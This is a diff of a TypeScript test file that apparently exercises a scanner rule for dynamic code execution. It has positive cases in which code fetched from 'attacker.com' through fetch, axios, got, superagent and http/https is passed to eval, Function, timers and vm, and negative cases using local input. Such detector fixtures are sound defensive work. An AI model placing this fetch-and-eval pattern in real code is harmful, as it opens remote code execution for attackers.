@@ -1,102 +1,126 @@
-// Mock dependencies to avoid TS errors
+// Dynamic Code Execution positive/negative test cases.
+
 import axios from 'axios';
-import fetch from 'node-fetch';
+import nodeFetch from 'node-fetch';
 import * as http from 'http';
 import * as https from 'https';
 import got from 'got';
 import superagent from 'superagent';
 import * as vm from 'vm';
 
+function executeAll(code: any) {
+    const evil = eval;
+    const Fn = Function;
+    const run = vm.runInThisContext;
+    const Script = vm.Script;
+
+    eval(code);
+    evil(code);
+    Function(code)();
+    Fn(code)();
+    setTimeout(code, 1000);
+    setInterval(code, 1000);
+    vm.runInThisContext(code);
+    run(code);
+    vm.runInNewContext(code, {});
+    new vm.Script(code);
+    new Script(code);
+}
+
 async function triggerRule() {
+    const url = 'http://attacker.com/code';
 
-    // FROM : 
-    // fetch / axios / http / https / got / superagent / 
-    // "message" event listener / "data" event listener
-    // 
-    // TO : 
-    // eval / new Function() / setTimeout / setInterval /
-    //  new vm.Script() / vm.runInNewContext
+    // global fetch
+    const globalFetchRes = await fetch(url);
+    executeAll(await globalFetchRes.text());
 
-    const f1 = await axios.get('http://attacker.com/code');
-    eval(f1.data);
-    new Function(await f1.text())();
-    setTimeout(await f1.text(), 1000);
-    setInterval(await f1.text(), 1000);
-    vm.runInNewContext(await f1.text());
-    new vm.Script(await f1.text());
+    // node-fetch import
+    const nodeFetchRes = await nodeFetch(url);
+    executeAll(await nodeFetchRes.text());
 
-    const f2 = fetch('http://attacker.com/code');
-    eval(f2.data);
-    new Function(await f2.text())();
-    setTimeout(await f2.text(), 1000);
-    setInterval(await f2.text(), 1000);
-    vm.runInNewContext(await f2.text());
-    new vm.Script(await f2.text());
+    // axios direct/get/post/request
+    const ax0 = await axios({ url, method: 'GET' });
+    executeAll(ax0.data);
 
-    https.get('https://attacker.com/code', (res) => {
+    const ax1 = await axios.get(url);
+    executeAll(ax1.data);
+
+    const ax2 = await axios.post(url, { q: 'x' });
+    executeAll(ax2.data);
+
+    const ax3 = await axios.request({ url, method: 'GET' });
+    executeAll(ax3.data);
+
+    // got direct/get/post
+    const g0 = await got(url);
+    executeAll(g0.body);
+
+    const g1 = await got.get(url);
+    executeAll(g1.body);
+
+    const g2 = await got.post(url);
+    executeAll(g2.body);
+
+    // superagent then
+    superagent.get(url).then((res: any) => {
+        executeAll(res.text);
+        executeAll(res.body);
+    });
+
+    // superagent end
+    superagent.get(url).end((err: any, res: any) => {
+        executeAll(res.text);
+        executeAll(res.body);
+    });
+
+    // superagent await
+    const sa = await superagent.get(url);
+    executeAll(sa.text);
+    executeAll(sa.body);
+
+    // https response data event
+    https.get(url, (res) => {
         let body = '';
-        res.on('data', (chunk) => { body += chunk; });
+
+        res.on('data', (chunk) => {
+            body += chunk;
+            executeAll(chunk);
+        });
+
         res.on('end', () => {
-            eval(body);
-            new Function(body)();
-            setTimeout(body, 1000);
-            setInterval(body, 1000);
-            vm.runInNewContext(body);
-            new vm.Script(body);
+            executeAll(body);
         });
     });
 
-    http.get('https://attacker.com/code', (res) => {
+    // http response data event
+    http.get(url, (res) => {
         let body = '';
-        res.on('data', (chunk) => { body += chunk; });
+
+        res.on('data', (chunk) => {
+            body += chunk;
+            executeAll(chunk);
+        });
+
         res.on('end', () => {
-            eval(body);
-            new Function(body)();
-            setTimeout(body, 1000);
-            setInterval(body, 1000);
-            vm.runInNewContext(body);
-            new vm.Script(body);
+            executeAll(body);
         });
     });
 
-    const f3 = await got('http://attacker.com/code');
-    eval(f3.data);
-    new Function(await f3.text())();
-    setTimeout(await f3.text(), 1000);
-    setInterval(await f3.text(), 1000);
-    vm.runInNewContext(await f3.text());
-    new vm.Script(await f3.text());
-
-    superagent.get('http://attacker.com/code').then((res: any) => {
-        const body = res.body
-        eval(body);
-        new Function(body)();
-        setTimeout(body, 1000);
-        setInterval(body, 1000);
-        vm.runInNewContext(body);
-        new vm.Script(body);
-    });
-
+    // browser message event
     if (typeof window !== 'undefined') {
-        window.addEventListener('message', (event: any) => {
-            const data = event.data;
-            eval(data);
-            new Function(data)();
-            setTimeout(data, 1000);
-            setInterval(data, 1000);
-            vm.runInNewContext(data);
-            new vm.Script(data);
+        window.addEventListener('message', (event: MessageEvent) => {
+            executeAll(event.data);
         });
     }
 
+    // Negative: local process event should not be treated as remote source.
     process.on('data' as any, (chunk: any) => {
-        eval(chunk);
-        new Function(chunk)();
-        setTimeout(chunk, 1000);
-        setInterval(chunk, 1000);
-        vm.runInNewContext(chunk);
-        new vm.Script(chunk);
+        executeAll(chunk);
     });
+
+    // Negative: local constant should not be reported.
+    const localCode = 'console.log("safe local test")';
+    executeAll(localCode);
 }
 
 triggerRule();
